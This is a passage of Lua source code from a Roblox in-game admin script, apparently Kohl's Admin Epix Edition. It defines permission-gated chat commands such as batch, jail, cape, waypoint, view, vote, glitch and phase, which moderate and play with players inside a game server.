	elseif v.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(plr,false))then
		allowed=true
		type='[Player]'
	elseif v.AdminLevel==1 and ((set.CheckDonor(plr) and (set.DonorPerks or set.CheckNTac(plr))) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Donor]'
	elseif v.AdminLevel==2 and set.CheckAdmin(plr,false) then
		allowed=true
		type='[Temp]'
	elseif v.AdminLevel==3 and set.CheckAdmin(plr,true) then
		allowed=true
		type='[Admin]'
	elseif v.AdminLevel==4 and set.CheckOwner(plr)  then
		allowed=true
		type='[Owner]'
	elseif v.AdminLevel==5 and set.CheckTrueOwner(plr) then
		allowed=true
		type='[Place Owner]'
	end
	local arguments=''
	for k,m in pairs(v.ArgTypes) do
		arguments=arguments..set['SplitKey']..m
	end
	if allowed then table.insert(temptable,{Object=v.Prefix..v.Cmds[1]..arguments,Desc=type..' | '..v.Desc,Filter=type}) end
end
set.Remote(plr,'Function','ListGui','Commands',temptable)
end)

set.MakeCommand('Lets you run mutliple commands, like :batch :ff me/:fly me/:noclip me',2,set.Prefix,{'batch','multicommand','batchrun'},{'cmd/cmd/cmd'},1,function(plr,args)
	for cmd in args[1]:gmatch('[^'..set.BatchSplit..']+') do
		set.ProcessCommand(plr,cmd,true)
	end
end)

set.MakeCommand('Gives you the admin script\'s custom chat, good for private conversations',2,set.Prefix,{'chat','customchat','chatgui'},{'player'},1,function(plr,args)
	for i,p in pairs(set.GetPlayers(plr, (args[1] or plr.Name))) do
		coroutine.wrap(function()
		set.Remote(p,"Function","CustomChatGui")
		local done=false
		local thing=p.CharacterAdded:connect(function(c) 
			set.Remote(p,'Function','MutePlayer','off') 
			done=true
		end)
		repeat wait() until not p or not p.Parent or done==true
		thing:disconnect() 
		end)()
	end
end)

set.MakeCommand('Gives you the normal chat back',2,set.Prefix,{'unchat','uncustomchat','removecustomchat','unchatgui'},{'player'},1,function(plr,args)
	for i,p in pairs(set.GetPlayers(plr, (args[1] or plr.Name))) do
		set.Remote(p,"Function","RemoveCustomChat")
		set.Remote(p,'Function','MutePlayer','off') 
	end
end)

set.MakeCommand('Makes a message of your choice pop up on the target\'s screen with an annoying alarm sound',3,set.Prefix,{'alert','alarm','annoy'},{'player','message'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		set.Remote(v,"Function","AlertGui",(args[2] or 'Alert | Alert | Alert | Alert | Alert'))
	end
end)

set.MakeCommand('Shows you how to use some syntax related things',0,set.Prefix,{'usage'},{},0,function(plr,args)
local usage={
'Special Functions: ';
'Ex: :kill FUNCTION, so like :kill '..set['SpecialPrefix']..'all';
'Put /e in front to make it silent (/e :kill kohl)';
set['SpecialPrefix']..'me - Runs a command on you';
set['SpecialPrefix']..'all - Runs a command on everyone';
set['SpecialPrefix']..'admins - Runs a command on all admins in the game';
set['SpecialPrefix']..'nonadmins - Same as !admins but for people who are not an admin';
set['SpecialPrefix']..'others - Runs command on everyone BUT you';
set['SpecialPrefix']..'random - Runs command on a random person';
'%TEAMNAME - Runs command on everyone in the team TEAMNAME Ex: :kill %raiders';
'$GROUPID - Run a command on everyone in the group GROUPID, Will default to the GroupId setting if no id is given';
'-PLAYERNAME - Will remove PLAYERNAME from list of players. :kill all,-kohl will kill everyone except kohl';
'Certain commands can be used by anyone, these commands have ! infront, such as !clean and !rejoin';
':kill me,noob1,noob2,'..set['SpecialPrefix']..'random,%raiders,$123456,!nonadmins,-kohl';
':batch :ff me/:sparkles me/:rocket jim';
':repeat 10(how many times to run the cmd) 1(how long in between runs) :respawn jim';
'Place owners can edit some settings in-game via the :settings command';
'Please refer to the Tips and Tricks section under the settings in the script for more detailed explanations'
}
--set.Remote(plr,'SetSetting','usage',usage)
set.Remote(plr,'Function','ListGui','Usage',usage)
end)

set.MakeCommand('Gives you the admin chat box',2,set.Prefix,{'achat','adminchat'},{},0,function(plr,args)
	set.AdminChat(plr)
end)

set.MakeCommand('Makes a new waypoint/sets an exiting one to your current position with the name <name> that you can teleport to using :tp me waypoint-<name>',2,set.Prefix,{'waypoint','wp','checkpoint'},{'name'},1,function(plr,args)
	local name=args[1] or tostring(#set.Waypoints+1)
	if plr.Character:FindFirstChild('Torso') then
		set.Waypoints[name]=plr.Character.Torso.Position
		set.Hint('Made waypoint '..name..' | '..tostring(set.Waypoints[name]),{plr})
	end
end)

set.MakeCommand('Deletes the waypoint named <name> if it exist',2,set.Prefix,{'delwaypoint','delwp','delcheckpoint','deletewaypoint','deletewp','deletecheckpoint'},{'name'},1,function(plr,args)
	for i,v in pairs(set.Waypoints) do
		if i:lower():sub(1,#args[1])==args[1]:lower() or args[1]:lower()=='all' then
			set.Waypoints[i]=nil
			set.Hint('Deleted waypoint '..i,{plr})
		end
	end
end)

set.MakeCommand('Shows available waypoints, mouse over their names to view their coordinates',2,set.Prefix,{'waypoints'},{},0,function(plr,args)
local temp={}
for i,v in pairs(set.Waypoints) do
	local x,y,z=tostring(v):match('(.*),(.*),(.*)')
	table.insert(temp,{Object=i,Desc='X:'..x..' Y:'..y..' Z:'..z})
end
set.Remote(plr,'Function','ListGui','Waypoints',temp)
end)

set.MakeCommand('Shows you admin cameras in the server and lets you delete/view them',2,set.Prefix,{'cameras','cams'},{},0,function(plr,args)
	set.Remote(plr,'Function','Cameras')
end)

set.MakeCommand('Makes a camera named whatever you pick',2,set.Prefix,{'makecam','cam','makecamera','camera'},{'name'},1,function(plr,args)
if plr and plr.Character and plr.Character:FindFirstChild('Head') then
	print('Checkelect')
	if workspace:FindFirstChild('Camera: '..args[1]) then
		set.Hint(args[1].." Already Exist!",{plr})
		print('O it already exist qq')
	else
	print('Makin cam')
	local cam=Instance.new('Part',workspace)
	cam.Position=plr.Character.Head.Position
	cam.Anchored=true
	cam.BrickColor=BrickColor.new('Really black')
	cam.CanCollide=false
	cam.Locked=true
	cam.FormFactor='Custom'
	cam.Size=Vector3.new(1,1,1)
	cam.TopSurface='Smooth'
	cam.BottomSurface='Smooth'
	cam.Name='Camera: '..args[1]
	Instance.new('PointLight',cam)
	cam.Transparency=0.9
	local mesh=Instance.new('SpecialMesh',cam)
	mesh.Scale=Vector3.new(1,1,1)
	mesh.MeshType='Sphere'
	table.insert(set.cameras,cam)
	end
	end
end)

set.MakeCommand('Forces one player to view another',2,set.Prefix,{'fview','forceview','forceviewplayer','fv'},{'player1','player2'},2,function(plr,args)
for k,p in pairs(set.GetPlayers(plr, args[1])) do
coroutine.wrap(function() 
for i,v in pairs(set.GetPlayers(plr, args[2])) do
if v and v.Character:FindFirstChild('Humanoid') then
	set.Remote(p,'Function','SetView',v.Character.Humanoid)
end
end
end)()
end
end)

set.MakeCommand('Makes you view the target player',2,set.Prefix,{'view','viewplayer','v'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
if v and v.Character:FindFirstChild('Humanoid') then
set.Remote(plr,'Function','SetView',v.Character.Humanoid)
end
end
end)

set.MakeCommand('Resets your view',2,set.Prefix,{'resetview','rv','fixcam'},{},0,function(plr,args)
set.Remote(plr,'Function','SetView','reset')
end)

set.MakeCommand('Shows you group ranks that have admin',2,set.Prefix,{'ranks','adminranks'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set.Ranks) do
if v.Rank and v.Type and v.Group then
table.insert(temptable,{Object=v.Rank,Desc='Type: '..v.Type..' - Group: '..v.Group})
end
end
--set.Remote(plr,'SetSetting','RanksCmdTable',temptable)
set.Remote(plr,'Function','ListGui','Ranks',temptable)
end)

set.MakeCommand('Shows you information about the current server',2,set.Prefix,{'details','meters','gameinfo','serverinfo'},{},0,function(plr,args)
set.Remote(plr,'Function','ServerDetails')
end)

set.MakeCommand('Shows you the changelog',2,set.Prefix,{'changelog','changes'},{},0,function(plr,args)
set.Remote(plr,'Function','ListGui','Change Log',set.Changelog)
end)

set.MakeCommand('Shows you player currently in-game, including nil ones',2,set.Prefix,{'players','allplayers','nilplayers'},{},0,function(plr,args)
local plrs={}
set.Remote(plr,'Function','Message','System Message','Pinging players, please wait a min, no ping means it was higher than 5 seconds.')
for i,v in pairs(set.GrabNilPlayers('all')) do
coroutine.wrap(function()
if game:service('Players'):FindFirstChild(v.Name) then
table.insert(plrs,{Object=v.Name,Desc='Lower: '..v.Name:lower()..' - Ping: '..set.Ping(v)..'s'})
else
table.insert(plrs,{Object='[NIL] '..v.Name,Desc='Lower: '..v.Name:lower()..' - Ping: '..set.Ping(v)..'s'})
end
end)()
end
wait(5)
--set.Remote(plr,'SetSetting','PlayerListCmd',plrs)
set.Remote(plr,'Function','ListGui','Players',plrs)
end)

set.MakeCommand('Shows you the admin script\'s version number',2,set.Prefix,{'version','ver'},{},0,function(plr,args)
	set.Message("Kohl's Admin [Epix Edition]", tostring(set.version), true, {plr}) 
end)

set.MakeCommand('Shows you the list of admins, also shows admins that are currently in the server',2,set.Prefix,{'admins','adminlist','owners','tempadmins'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set['Owners']) do table.insert(temptable,v .. " - Owner") end
for i,v in pairs(set['Admins']) do table.insert(temptable,v .. " - Admin") end
for i,v in pairs(set['TempAdmins']) do table.insert(temptable,v .. " - TempAdmin") end 
for i,v in pairs(set.tal) do table.insert(temptable,v .. " - TempAdmin [Synced]") end 
for i,v in pairs(set.al) do table.insert(temptable,v .. " - Admin [Synced]") end 
for i,v in pairs(set.oal) do table.insert(temptable,v .. " - Owner [Synced]") end 
table.insert(temptable,'==== Admins In-Game ====')
for i,v in pairs(game:service('Players'):children()) do 
	if set.CheckOwner(v) then 
		table.insert(temptable,v.Name..':'..v.userId..' - Owner')
	elseif set.CheckAdmin(v,true) then
		table.insert(temptable,v.Name..':'..v.userId..' - Admin')
	elseif set.CheckAdmin(v,false) then
		table.insert(temptable,v.Name..':'..v.userId..' - TempAdmin')
	end 
end
--set.Remote(plr,'SetSetting','AdminListTable',temptable)
set.Remote(plr,'Function','ListGui','Admin List',temptable)
end)

set.MakeCommand('Shows you the normal ban list',2,set.Prefix,{'banlist','banned','bans'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','Banlist',set['BanList'])
set.Remote(plr,'Function','ListGui','Ban List',set.BanList)
end)

set.MakeCommand('Lets you send players a yes or no question and then displays percentages when done',2,set.Prefix,{'vote','makevote','startvote','question','survey'},{'player','time','question'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local Time=tonumber(args[2]) 
local question=args[3]
local tname=plr.Name..question
set.OpenVote[tname]={}
local vote=set.OpenVote[tname]
if Time > 60 then Time = 60 end
vote.Yes=0
vote.No=0
vote.novote={}
for ik,pl in pairs(plrz) do
set.Remote(pl,'Function','VoteQuestion',tname,question,Time)
table.insert(vote.novote, pl)
end
wait(Time+1)
set.Remote(plr,'Function','VoteResults',question,set.Round(vote.Yes/#plrz*100),set.Round(vote.No/#plrz*100),set.Round(#vote.novote/#plrz*100),vote.Yes,vote.No,#vote.novote)
end)

set.MakeCommand('Shows you a list of tools that can be obtains via the give command',2,set.Prefix,{'tools','toollist'},{},0,function(plr,args)
local temptable={}
for i, v in pairs(set.Storage:children()) do 
	if v:IsA("Tool") or v:IsA("HopperBin") then 
		table.insert(temptable,{Object=v.Name,Desc=v:GetFullName()})
	end 
end
--set.Remote(plr,'SetSetting','toollist',temptable)
set.Remote(plr,'Function','ListGui','Tools',temptable)
end)

set.MakeCommand('Inserts whatever object belongs to the ID you supply, the object must be in the place owner\'s or ROBLOX\'s inventory',2,set.Prefix,{'insert','ins'},{'id'},1,function(plr,args)
local obj = game:service("InsertService"):LoadAsset(tonumber(args[1]))
if obj and #obj:children() >= 1 and plr.Character then
table.insert(set.objects, obj) for i,v in pairs(obj:children()) do table.insert(set.objects, v) end obj.Parent = game.Workspace obj:MakeJoints() obj:MoveTo(plr.Character:GetModelCFrame().p)
end
end)

set.MakeCommand('Remove admin objects',2,set.Prefix,{'clear','cleargame','clr'},{},0,function(plr,args)
for i,v in pairs(set.objects) do if v:IsA("Script") or v:IsA("LocalScript") then v.Disabled = true end v:Destroy() end
for i,v in pairs(set.cameras) do if v then table.remove(set.cameras,i) v:Destroy() end end
for i,v in pairs(game:service('Workspace'):children()) do if v:IsA('Message') or v:IsA('Hint') then v:Destroy() end if v.Name:match('Kohls Probe (.*)') then v:Destroy() end end
set.objects = {}
set.RemoveMessage()
end)

set.MakeCommand('Reset lighting back to the setting it had on server start',2,set.Prefix,{'fix','resetlighting','undisco','unflash','fixlighting'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
game:service('Lighting').Ambient = set.OrigLightingSettings.abt
game:service('Lighting').GlobalShadows = set.OrigLightingSettings.gs
game:service('Lighting').ShadowColor = set.OrigLightingSettings.sc
game:service('Lighting').Outlines = set.OrigLightingSettings.ol
game:service('Lighting').OutdoorAmbient = set.OrigLightingSettings.oabt
game:service('Lighting').Brightness = set.OrigLightingSettings.brt
game:service('Lighting').TimeOfDay = set.OrigLightingSettings.time
game:service('Lighting').FogColor = set.OrigLightingSettings.fclr
game:service('Lighting').FogEnd = set.OrigLightingSettings.fe
game:service('Lighting').FogStart = set.OrigLightingSettings.fs
end)

set.MakeCommand('Opens the command box',2,set.Prefix,{'cmdbar','commandbar','cmdbox','commandbox','cmdgui','commandgui'},{},0,function(plr,args)
set.CmdBar(plr)
end)

set.MakeCommand('Countdown',2,set.Prefix,{'countdown'},{'time'},1,function(plr,args)
local num = math.min(tonumber(args[1]),120)
for i = num, 1, -1 do
coroutine.resume(coroutine.create(function() set.Message(" ", i, false, game:service('Players'):children(), 1) end))
wait(1)
end
end)

set.MakeCommand('Make a message and makes it stay for the amount of time (in seconds) you supply',2,set.Prefix,{'tm','timem','timedmessage'},{'time','message'},2,function(plr,args) 
local num = args[1]
set.Message("Message from " .. plr.Name, args[2], false, game:service('Players'):children(), num)
end)

set.MakeCommand('Makes a message',2,set.Prefix,{'m','message'},{'message'},1,function(plr,args)
if not args[1] then return end
set.Message("Message from " .. plr.Name, args[1], true, game:service('Players'):children())
end)

set.MakeCommand('Makes a hint',2,set.Prefix,{'h','hint'},{'message'},1,function(plr,args)
if not args[1] then return end
set.Hint(plr.Name .. ": " .. args[1], game:service('Players'):children())
end)

set.MakeCommand('Shows you information about the target player',2,set.Prefix,{'info','age'},{'player'},1,function(plr,args)
	local plz = set.GetPlayers(plr, args[1]:lower())
	for i,v in pairs(plz) do
	coroutine.wrap(function()
	set.GetPlayerInfo(v,{plr},'Player Info')
	end)()
	end
end)

set.MakeCommand('Sets target player(s)\'s leadder stats to 0',2,set.Prefix,{'resetstats'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("leaderstats") then
for a,q in pairs(v.leaderstats:children()) do
if q:IsA("IntValue") then q.Value = 0 end
end
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) a gear from the catalog based on the ID you supply',2,set.Prefix,{'gear','givegear'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local obj = game:service("InsertService"):LoadAsset(tonumber(args[2]))
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = v.Backpack end end
obj:Destroy()
end
end))
end
end)

set.MakeCommand('Prompts the player(s) to buy the product beloging to the ID you supply',2,set.Prefix,{'sell'},{'player','id','currency'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
local type = args[3] or 'default'
local t
if type:lower()=='tix' or type:lower()=='tickets' or type:lower()=='t' then
	t=Enum.CurrencyType.Tix
elseif type:lower()=='robux' or type:lower()=='rb' or type:lower()=='r' then
	t=Enum.CurrencyType.Robux
else
	t=Enum.CurrencyType.Default
end
if v then
game:GetService("MarketplaceService"):PromptPurchase(v,tonumber(args[2]),false,t)
end
end))
end
end)

set.MakeCommand('Gives the target player(s) a hat based on the ID you supply',2,set.Prefix,{'hat','givehat'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
local obj = game:service("InsertService"):LoadAsset(tonumber(args[2]))
for a,hat in pairs(obj:children()) do if hat:IsA("Hat") then hat.Parent = v.Character end end
obj:Destroy()
end
end))
end
end)

set.MakeCommand('Shows you the list of capes for the cape command',2,set.Prefix,{'capes','capelist'},{},0,function(plr,args)
local list = {"script","new yeller","pastel blue","dusty rose","cga brown","random","shiny","gold","kohl","epix","superman","swag","donor","starbucks","gomodern","admin","host","cohost","trainer","giovannis"}
--set.Remote(plr,'SetSetting','CapeList',list)
set.Remote(plr,'Function','ListGui','Cape List',list)
end)

set.MakeCommand('Gives the target player(s) the cape specified, do '..set.Prefix..'capes to view a list of available capes ',2,set.Prefix,{'cape','givecape'},{'player','cape/color/id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
if not args[2] then args[2]='White' end
for i,v in pairs(plrz) do
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
if args[2]:lower() == "new yeller" then set.Cape(v,'Fabric',"New Yeller") 
elseif args[2]:lower() == "pastel blue" then set.Cape(v,'Fabric',"Pastel Blue") 
elseif args[2]:lower() == "dusty rose" then set.Cape(v,'Fabric',"Dusty Rose") 
elseif args[2]:lower() == "cga brown" then set.Cape(v,'Fabric',"CGA brown") 
elseif args[2]:lower() == "random" then set.Cape(v,'Fabric',BrickColor.random()) 
elseif args[2]:lower() == "shiny" then set.Cape(v,'Plastic',"Institutional white",false,1) 
elseif args[2]:lower() == "gold" then set.Cape(v,'Plastic',"Bright yellow",false,0.4)
elseif args[2]:lower() == "kohl" then set.Cape(v,'Fabric',"Really black","108597653") 
elseif args[2]:lower() == "script" then set.Cape(v,'Plastic',"White","151359194") 
elseif args[2]:lower() == "batman" then set.Cape(v,'Fabric',"Institutional white","108597669") 
elseif args[2]:lower() == "epix" then set.Cape(v,'Plastic',"Really black","149442745") 
elseif args[2]:lower() == "superman" then set.Cape(v,'Fabric',"Bright blue","108597677") 
elseif args[2]:lower() == "swag" then set.Cape(v,'Fabric',"Pink","109301474") 
elseif args[2]:lower() == "donor" then set.Cape(v,'Plastic',"White","149009184") 
elseif args[2]:lower() == "starbucks" then set.Cape(v,'Plastic',"Black","149248066") 
elseif args[2]:lower() == "gomodern" then set.Cape(v,'Plastic',"Really black","149438175") 
elseif args[2]:lower() == "admin" then set.Cape(v,'Plastic',"White","149092195") 
elseif args[2]:lower() == "giovannis" then set.Cape(v,'Plastic',"White","149808729") 
elseif args[2]:lower() == "godofdonuts" then set.Cape(v,'Plastic',"Institutional white","151034443") 
elseif args[2]:lower() == "host" then set.Cape(v,'Plastic',"Really black","152299000") 
elseif args[2]:lower() == "cohost" then set.Cape(v,'Plastic',"Really black","152298950") 
elseif args[2]:lower() == "trainer" then set.Cape(v,'Plastic',"Really black","152298976") 
elseif args[2]:lower() == "ba" or args[2]:lower() == "beardedalien" or args[2]:lower() == "beard" then set.Cape(v,'Plastic','White',172528001)
elseif BrickColor.new(args[2]) ~= nil then set.Cape(v,'Fabric',args[2]) 
elseif tonumber(args[2]) ~= nil then set.Cape(v,'Fabric','White',args[2]) 
end
end
end)

set.MakeCommand('Removes the target player(s)\'s cape',2,set.Prefix,{'uncape','removecape'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
pcall(function() v.Character.EpicCape:Destroy() end)
end
end)

set.MakeCommand('Makes the target player(s) slide when they walk',2,set.Prefix,{'slippery','iceskate','icewalk','slide'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','slip')
end
end)

set.MakeCommand('NoClips the target player(s)',2,set.Prefix,{'noclip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','norm')
end
end)

set.MakeCommand('Old flying NoClip',2,set.Prefix,{'flynoclip','oldnolcip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','fly')
end
end)

set.MakeCommand('Un-NoClips the target player(s)',2,set.Prefix,{'clip','unnoclip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','off')
end
end)

set.MakeCommand('Jails the target player(s), removing their tools until they are un-jailed',2,set.Prefix,{'jail','imprison'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character and v.Character:FindFirstChild("Torso") then 
local cf = v.Character.Torso.CFrame + Vector3.new(0,1,0)
local origpos = v.Character.Torso.Position
local mod = Instance.new("Model", game.Workspace) mod.Name = v.Name .. " Epix Jail" table.insert(set.objects, mod) 
local value = Instance.new('StringValue',mod) value.Name='Player' value.Value=v.Name
local top = Instance.new("Part", mod) top.Locked = true top.formFactor = "Symmetric" top.Size = Vector3.new(6,1,6) top.TopSurface = 0 top.BottomSurface = 0 top.Anchored = true top.BrickColor = BrickColor.new("Really black") top.CFrame = cf * CFrame.new(0,-3.5,0)
set.JailedTools[v.Name]=Instance.new('Model') 
local bottom = top:Clone() bottom.Transparency = 1 bottom.Parent = mod bottom.CFrame = cf * CFrame.new(0,3.5,0)
local front = top:Clone() front.Transparency = 1 front.Reflectance = 0 front.Parent = mod front.Size = Vector3.new(6,6,1) front.CFrame = cf * CFrame.new(0,0,-3)
local back = front:Clone() back.Transparency = 1 back.Parent = mod back.CFrame = cf * CFrame.new(0,0,3)
local right = front:Clone() right.Transparency = 1 right.Parent = mod right.Size = Vector3.new(1,6,6) right.CFrame = cf * CFrame.new(3,0,0)
local left = right:Clone() left.Transparency = 1 left.Parent = mod left.CFrame = cf * CFrame.new(-3,0,0)
local msh = Instance.new("BlockMesh", front) msh.Scale = Vector3.new(1,1,0)
local msh2 = msh:Clone() msh2.Parent = back
local msh3 = msh:Clone() msh3.Parent = right msh3.Scale = Vector3.new(0,1,1)
local msh4 = msh3:Clone() msh4.Parent = left
local brick = Instance.new('Part',mod)
local box = Instance.new('SelectionBox',brick)
box.Adornee=brick
box.Color=BrickColor.new('White')
brick.Anchored=true
brick.CanCollide=false
brick.Transparency=1
brick.Size=Vector3.new(5,7,5) 
brick.CFrame=cf--*CFrame.new(0,-1,0)
v.Character.Torso.CFrame = cf
for l,k in pairs(v.Backpack:children()) do 
	if k and k.ClassName=='Tool' or k.ClassName=='HopperBin' then 
		k.Parent=set.JailedTools[v.Name]
	end 
end
coroutine.wrap(function()
repeat
	local player=game:service('Players'):FindFirstChild(v.Name)
	if not player then return end
	local torso=player.Character:FindFirstChild('Torso')
	if not torso then return end
	if not set.JailedTools[v.Name] or set.JailedTools[v.Name]==nil then set.JailedTools[v.Name]=Instance.new('Model') end
	for l,k in pairs(player.Backpack:children()) do 
		if k and k.ClassName=='Tool' or k.ClassName=='HopperBin' then 
			k.Parent=set.JailedTools[v.Name]--tools 
		end 
	end 
	if (torso.Position-origpos).magnitude>5 then
		torso.CFrame = cf 
	end
	wait()
until not mod or not mod.Parent or set.JailedTools[v.Name]==nil
end)()
end
end)()
end
end)

set.MakeCommand('UnJails the target player(s) and returns any tools that were taken from them while jailed',2,set.Prefix,{'unjail','free','release'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do 
	coroutine.wrap(function() 
		if v then 
			for a, jl in pairs(game.Workspace:children()) do 
				if jl.Name == v.Name .. " Epix Jail" then 
					jl:Destroy() 
				end 
			end 
		if set.JailedTools[v.Name] then
			for j,tewl in pairs(set.JailedTools[v.Name]:children()) do 
				if tewl then
					tewl.Parent=v.Backpack 
				end
			end
			set.JailedTools[v.Name]=nil
		end
	set.JailedTools[v.Name]=nil 
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) a little chat gui, when used will let them chat using dialog bubbles',2,set.Prefix,{'bchat','dchat','bubblechat','dialogchat'},{'player','color(red/green/blue)'},2,function(plr,args)
	local color=Enum.ChatColor.Red
	if not args[2] then
		color=Enum.ChatColor.Red
	elseif args[2]:lower()=='red' then
		color=Enum.ChatColor.Red
	elseif args[2]:lower()=='green' then
		color=Enum.ChatColor.Green
	elseif args[2]:lower()=='blue' then
		color=Enum.ChatColor.Blue
	end
	for i,v in pairs(set.GetPlayers(plr,(args[1] or plr.Name))) do
		set.Remote(v,"Function","BubbleChat",color)
	end
end)

set.MakeCommand('Shows you where the target player(s) is/are',2,set.Prefix,{'track','trace','find'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(plr,'Function','Find','on',v)
	end
end)

set.MakeCommand('Stops tracking the target player(s)',2,set.Prefix,{'untrack','untrace','unfind'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(plr,'Function','Find','off',v)
	end
end)

set.MakeCommand('Makes the target player(s)\'s character teleport back and forth rapidly, quite trippy, makes bricks appear to move as the player turns their character',2,set.Prefix,{'glitch','glitchdisorient','glitch1','gd'},{'player','intensity'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		local num=args[2] or 15
		set.Remote(v,'Function','Glitch','trippy',num)
	end
end)

set.MakeCommand('The same as gd but less trippy, teleports the target player(s) back and forth in the same direction, making two ghost like images of the game',2,set.Prefix,{'glitch2','glitchghost','gg'},{'player','intensity'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		local num=args[2] or 150
		set.Remote(v,'Function','Glitch','ghost',num)
	end
end)

set.MakeCommand('Kinda like gd, but teleports the player to four points instead of two',2,set.Prefix,{'vibrate','glitchvibrate','gv'},{'player','intensity'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		local num=args[2] or 0.1
		set.Remote(v,'Function','Glitch','vibrate',num)
	end
end)

set.MakeCommand('UnGlitchs the target player(s)',2,set.Prefix,{'unglitch','unglitchghost','ungd','ungg','ungv'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		set.Remote(v,'Function','Glitch','off')
	end
end)

set.MakeCommand('Shows you the current message of the day',0,set.AnyPrefix,{'motd','messageoftheday','daymessage'},{},0,function(plr,args)
	set.PM('Message of the Day',plr,game:service('MarketplaceService'):GetProductInfo(set.MessageOfTheDayID).Description)
end)

set.MakeCommand('Makes a clone of target player(s)\'s character and parents their real on to their local camera, no one can see them until they are unphased',2,set.Prefix,{'phase'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		coroutine.wrap(function()
		for k,m in pairs(workspace:children()) do if m.Name==v.Name and m:FindFirstChild('FakeCharPhased') then m:Destroy() end end
		set.Remote(v,'Function','Phase',false)
		wait(set.Ping(v)+0.3)
		for a,obj in pairs(v.Character:children()) do if obj.Name~='HumanoidRootPart' then if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end end end
		v.Character.Archivable=true
		local hum=v.Character:FindFirstChild('Humanoid')
		local cl=v.Character:clone()
		v.Character.Archivable=false
		pcall(function() cl.Animate:Destroy() end)
		local anim=deps.Animate:clone()
		anim.Parent=cl
		anim.Disabled=false
		local val=Instance.new('StringValue',cl)
		val.Name='FakeCharPhased'
		cl.Parent=workspace
		v.Character.Torso.CFrame=v.Character.Torso.CFrame*CFrame.new(0,0,1)
		for a,obj in pairs(v.Character:children()) do if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end end
		set.Remote(v,'Function','Phase',true)
		repeat wait() until not hum or not hum.Parent or not cl or not cl.Parent
		if cl then cl:Destroy() end
		end)()
	end
end)

set.MakeCommand('UnPhases the target player(s)',2,set.Prefix,{'unphase'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		for k,m in pairs(workspace:children()) do if m.Name==v.Name and m:FindFirstChild('FakeCharPhased') then m:Destroy() end end
		set.Remote(v,'Function','Phase',false)
		v.Character:MakeJoints()
		print(v.Character.Humanoid.Health)
		wait(set.Ping(v)+0.3)
		v.Character:MakeJoints()
		print(v.Character.Humanoid.Health)
		for a,obj in pairs(v.Character:children()) do if obj.Name~='HumanoidRootPart' then if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end end end
	end
end)

set.MakeCommand('Removes the bubble chat gui from the target player(s)',2,set.Prefix,{'unbchat','unbubblechat','undchat','undialogchat'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,(args[1] or plr.Name))) do
		set.Remote(v,'Function','BubbleChat','off')
	end
end)

set.MakeCommand('Gives the target player(s) tools that are in their StarterPack',2,set.Prefix,{'startertools','starttools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
for a,q in pairs(game.StarterPack:children()) do q:Clone().Parent = v.Backpack end
end
end))
end
end)

